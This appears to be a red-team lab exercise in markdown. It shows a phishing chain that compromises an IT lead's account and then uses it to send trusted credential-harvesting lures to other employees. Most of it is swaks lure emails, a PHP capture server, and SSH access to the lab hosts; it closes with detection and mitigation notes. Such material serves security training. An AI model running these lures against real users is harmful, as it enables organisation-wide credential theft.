## **Law 42 — Strike the Shepherd and the Sheep Will Scatter**

Interpretation (offensive context):  
Compromising a **central authority or control node** (team lead, admin, shared service account) creates **disproportionate impact**—access, trust propagation, and workflow disruption cascade from that point.

---

# 🎯 Attack Scenario — _Central Account Compromise → Org-Wide Leverage_

You target a **high-influence account** (e.g., shared IT mailbox or team lead), then use it to **broadcast actions** that downstream users trust.

**Primary Target (shepherd):**

> _Marcus Hale_ — IT Team Lead / shared support mailbox

**Downstream Targets (sheep):**

> Multiple employees across departments

**Attacker Persona (initial vector):**

> _Irina Lebedeva_, 20 y/o IT Ops Intern

---

# 🔴 Red Team Objective

- Achieve:
    
    - compromise of a **central account**
        
- Leverage:
    
    - that account to reach **many users with high trust**
        
- Result:
    
    - multi-user credential capture / workflow control
        

---

# 🖥️ Lab Setup (resource-aware)

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim 1 (IT Lead / shared mailbox)** — 2GB
    
- **Ubuntu Victim 2 (User A)** — 2GB
    
- _(Optional)_ Ubuntu Victim 3 (User B) — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Initial Compromise (Shepherd)

```bash
swaks --to itlead@corp.local \
--from irina.l@corp.local \
--server 192.168.56.101 \
--data "Subject: Ticketing sync issue

Hi,

We’re validating ticketing access. Please confirm here:

http://192.168.56.101:8080"
```

### Payload (standard):

```bash
php -S 0.0.0.0:8080
```

👉 Capture:

```
itlead:password
```

---

## Phase 2 — Access & Validation

```bash
ssh itlead@192.168.56.102
```

👉 Confirm:

- mailbox/control access
    
- internal communication capability
    

---

## Phase 3 — Broadcast from Trusted Source

Now operate **as the shepherd**:

```bash
swaks --to user1@corp.local \
--from itlead@corp.local \
--server 192.168.56.101 \
--data "Subject: Access update

Hi,

We’ve rolled out an access update. Please re-authenticate:

http://192.168.56.101:8080"
```

Repeat for multiple users.

👉 This message now has:

- high trust
    
- no external indicators
    

---

## Phase 4 — Payload Reuse

Same capture backend collects multiple credentials:

```php
file_put_contents("creds.txt", ...)
```

---

## Phase 5 — Execution

Users:

- trust IT lead / shared mailbox
    
- comply quickly
    
- submit credentials
    

👉 One compromise → many compromises

---

# 🛠️ Tooling + Commands

### Initial vector:

```bash
swaks --to itlead@corp.local --from irina.l@corp.local
```

### Post-compromise broadcast:

```bash
swaks --to user@corp.local --from itlead@corp.local
```

### Hosting:

```bash
php -S 0.0.0.0:8080
```

### Access:

```bash
ssh itlead@target
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Authority amplification**
    
- **Trust transference at scale**
    
- **Single-point-of-failure exploitation**
    

Key principle:

> Compromise the source of trust, and trust propagates the attack for you

---

# 🛡️ Detection & Defensive Insight

Indicators:

- unusual messages from:
    
    - IT lead / shared accounts
        
- sudden org-wide requests
    
- repeated login prompts from internal source
    

Mitigation:

- enforce:
    
    - MFA on **high-privilege accounts**
        
- monitor:
    
    - broadcast behavior anomalies
        
- implement:
    
    - least privilege for shared accounts
        
- alert on:
    
    - mass messaging patterns
        

---

# 📄 Report Artifact

### Title:

> Multi-User Compromise via Central Authority Account Exploitation

### Include:

- attack chain:
    
    - compromise → broadcast → cascade
        
- emails (initial + broadcast)
    
- credential capture (multiple users)
    
- analysis:
    
    - why central account amplified impact
        
- impact:
    
    - organization-wide exposure
        

---

# ⚠️ Operator Insight

Attacking individuals:

- limited impact
    

Attacking central nodes:

- exponential impact
    

You don’t scale by sending more attacks  
You scale by **choosing the right target**

---

